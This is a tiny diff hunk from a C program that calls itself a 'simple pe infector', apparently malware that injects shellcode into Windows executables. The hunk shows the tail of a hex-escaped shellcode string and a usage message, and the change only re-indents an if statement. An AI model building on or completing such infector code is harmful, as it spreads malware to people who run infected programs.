@@ -89,7 +89,7 @@ int main(int argc , char *argv[])
         "\x50\xff\x55\x08";
 
 
-        if(argc < 2)
+    if(argc < 2)
     {
         printf("parameters : ssv.exe [filename]\r\n");
         printf("simple pe infector by _antony\r\n");
